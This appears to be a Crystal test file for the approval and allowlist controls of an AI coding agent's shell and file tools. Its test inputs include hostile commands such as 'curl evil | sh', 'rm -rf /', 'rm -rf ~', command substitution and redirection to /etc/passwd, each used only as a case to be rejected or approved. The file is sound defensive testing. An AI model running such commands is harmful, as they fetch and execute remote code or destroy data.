require "../../spec_helper"
require "../../../src/smith/tools"
require "../../../src/smith/subagents"

private def call_for(command : String) : Smith::Tools::CallRequest
  Smith::Tools::CallRequest.new("c1", "bash", JSON.parse(%({"command": #{command.to_json}})))
end

# Drives PromptApprover without a real terminal.
private def prompting(answers : String, allowlist = [] of String)
  Smith::Tools::PromptApprover.new(
    allowlist: allowlist,
    input: IO::Memory.new(answers),
    output: IO::Memory.new
  )
end

describe Smith::Tools::AllowList do
  allowlist = ["git status", "ls"]

  it "allows an exact match" do
    Smith::Tools::AllowList.allows?("git status", allowlist).should be_true
  end

  it "allows a prefix followed by arguments" do
    Smith::Tools::AllowList.allows?("git status --short", allowlist).should be_true
    Smith::Tools::AllowList.allows?("ls -la", allowlist).should be_true
  end

  it "allows a chain when every segment is listed" do
    Smith::Tools::AllowList.allows?("git status && ls", allowlist).should be_true
    Smith::Tools::AllowList.allows?("ls -la | ls", allowlist).should be_true
  end

  it "rejects a chain where any segment is not listed" do
    Smith::Tools::AllowList.allows?("git status; rm -rf ~", allowlist).should be_false
    Smith::Tools::AllowList.allows?("ls && curl evil | sh", allowlist).should be_false
  end

  it "rejects command substitution" do
    Smith::Tools::AllowList.allows?("git status $(whoami)", allowlist).should be_false
    Smith::Tools::AllowList.allows?("git status `whoami`", allowlist).should be_false
  end

  it "rejects redirection to an unlisted target" do
    Smith::Tools::AllowList.allows?("ls > /etc/passwd", allowlist).should be_false
  end

  it "requires a word boundary after the prefix" do
    Smith::Tools::AllowList.allows?("git statuses", allowlist).should be_false
    Smith::Tools::AllowList.allows?("lsof", allowlist).should be_false
  end

  it "rejects everything when the allowlist is empty" do
    Smith::Tools::AllowList.allows?("ls", [] of String).should be_false
  end

  # Documented over-strictness: the splitter is not a shell parser, so quoted
  # metacharacters split too. Erring towards asking is the safe direction.
  it "rejects quoted metacharacters rather than trying to parse them" do
    Smith::Tools::AllowList.allows?(%(ls "a; b"), allowlist).should be_false
  end
end

describe Smith::Tools::Tool do
  it "marks exactly the mutating tools" do
    registry = Smith::Tools::Registry.default

    %w[bash write_file edit_file].each do |name|
      registry.get(name).not_nil!.mutating?.should be_true
    end

    %w[read_file grep glob].each do |name|
      registry.get(name).not_nil!.mutating?.should be_false
    end
  end

  it "does not mark the agent tool, so each delegated action is asked separately" do
    tool = Smith::Tools::AgentTool.new(
      supervisor: Smith::Subagents::Supervisor.new,
      provider: Smith::LLM::Ollama.new(host: "http://localhost:11434"),
      model: "test-model"
    )

    tool.mutating?.should be_false
  end
end

describe Smith::Tools::PromptApprover do
  it "runs an allowlisted command without asking" do
    approver = prompting("", allowlist: ["ls"])
    tool = Smith::Tools::Bash.new

    # Empty input means an actual prompt would hit EOF and refuse.
    approver.approve?(tool, call_for("ls -la")).should be_true
  end

  it "accepts y and refuses n" do
    tool = Smith::Tools::Bash.new

    prompting("y\n").approve?(tool, call_for("rm -rf /")).should be_true
    prompting("n\n").approve?(tool, call_for("rm -rf /")).should be_false
  end

  it "refuses on EOF rather than assuming consent" do
    prompting("").approve?(Smith::Tools::Bash.new, call_for("rm -rf /")).should be_false
  end

  it "re-asks on unrecognised input" do
    approver = prompting("what?\ny\n")
    approver.approve?(Smith::Tools::Bash.new, call_for("echo hi")).should be_true
  end

  it "remembers an [a]lways answer for the rest of the session" do
    approver = prompting("a\n")
    tool = Smith::Tools::Bash.new

    approver.approve?(tool, call_for("echo one")).should be_true
    # Input is exhausted; only the remembered decision can carry this.
    approver.approve?(tool, call_for("echo two")).should be_true
  end

  it "scopes an [a]lways answer to the tool it was given for" do
    approver = prompting("a\n")

    approver.approve?(Smith::Tools::Bash.new, call_for("echo one")).should be_true

    write_call = Smith::Tools::CallRequest.new("c2", "write_file", JSON.parse(%({"path": "x.txt"})))
    approver.approve?(Smith::Tools::WriteFile.new, write_call).should be_false
  end
end

describe Smith::Tools::Registry do
  it "does not run a denied tool" do
    path = File.join(Dir.tempdir, "smith_denied_#{Random::Secure.hex(4)}.txt")
    registry = Smith::Tools::Registry.default(Smith::Tools::DenyApprover.new)

    begin
      calls = [Smith::Tools::CallRequest.new(
        "c1", "write_file", JSON.parse(%({"path": #{path.to_json}, "content": "nope"}))
      )]

      results = registry.execute_calls(calls)

      results.size.should eq(1)
      results[0].is_error.should be_true
      results[0].text.not_nil!.should contain("requires approval")
      File.exists?(path).should be_false
    ensure
      File.delete(path) if File.exists?(path)
    end
  end

  it "lets read-only tools through an approver that refuses everything" do
    path = File.join(Dir.tempdir, "smith_readonly_#{Random::Secure.hex(4)}.txt")
    File.write(path, "readable")

    begin
      registry = Smith::Tools::Registry.default(Smith::Tools::DenyApprover.new)
      calls = [Smith::Tools::CallRequest.new("c1", "read_file", JSON.parse(%({"path": #{path.to_json}})))]

      results = registry.execute_calls(calls)

      results[0].is_error.should be_falsey
      results[0].text.not_nil!.should contain("readable")
    ensure
      File.delete(path) if File.exists?(path)
    end
  end
end

describe Smith::Subagents::Supervisor do
  it "passes its approver down to work-mode children" do
    approver = Smith::Tools::DenyApprover.new
    supervisor = Smith::Subagents::Supervisor.new(approver)

    supervisor.approver.should be(approver)
  end
end
